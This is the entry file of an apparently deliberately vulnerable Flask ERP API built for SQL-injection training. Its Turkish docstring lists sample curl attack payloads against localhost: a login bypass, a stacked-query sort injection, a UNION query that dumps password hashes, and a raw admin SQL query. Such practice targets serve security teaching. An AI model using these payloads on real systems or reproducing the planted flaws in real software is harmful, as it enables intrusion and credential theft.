#!/usr/bin/env python3
"""
Kurumsal ERP API — Kasıtlı SQL Enjeksiyonu İçeren Eğitim/Test Uygulaması
=========================================================================

UYARI: Bu kod ÜRETİM ORTAMINDA KULLANILMAMALIDIR.
Tüm SQL sorguları kasıtlı olarak güvensiz yazılmıştır.

Çalıştırma:
    pip install -r requirements.txt
    python app.py

Örnek saldırı vektörleri (eğitim amaçlı):
    # Login bypass
    curl -X POST http://localhost:5000/api/auth/login \\
      -H "Content-Type: application/json" \\
      -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "x"}'

    # ORDER BY enjeksiyonu
    curl "http://localhost:5000/api/employees?sort=id;SELECT+sqlite_version()--&dir=ASC"

    # Dinamik WHERE
    curl -X POST http://localhost:5000/api/employees/filter \\
      -H "Content-Type: application/json" \\
      -d '{"where": "1=1 UNION SELECT id,username,email,password_hash,full_name,1,0,'\''admin'\'',1,notes,created_at FROM employees--"}'

    # Admin ham SQL
    curl -X POST http://localhost:5000/api/employees/admin/query \\
      -H "Content-Type: application/json" \\
      -H "X-User-Id: 1" \\
      -d '{"sql": "SELECT sql FROM sqlite_master"}'
"""

from flask import Flask, jsonify

import config
from api.routes import api
from database import db


def create_app() -> Flask:
    application = Flask(__name__)
    application.config["SECRET_KEY"] = config.SECRET_KEY
    application.config["DEBUG"] = config.DEBUG

    application.register_blueprint(api, url_prefix="/api")

    @application.route("/health")
    def health() -> tuple:
        try:
            db.execute_raw("SELECT 1", fetch="one")
            return jsonify({"status": "healthy", "database": "connected"}), 200
        except Exception as exc:
            return jsonify({"status": "unhealthy", "error": str(exc)}), 503

    @application.route("/")
    def index() -> tuple:
        return jsonify({
            "name": "Vulnerable ERP API",
            "version": "1.0.0-edu",
            "warning": "This application contains intentional SQL injection vulnerabilities for security training.",
            "endpoints": "/api/*",
        }), 200

    return application


app = create_app()


if __name__ == "__main__":
    print("=" * 60)
    print("  UYARI: Kasıtlı SQL zaafiyetleri içeren eğitim uygulaması")
    print("  Üretim ortamında ÇALIŞTIRMAYIN")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=config.DEBUG)
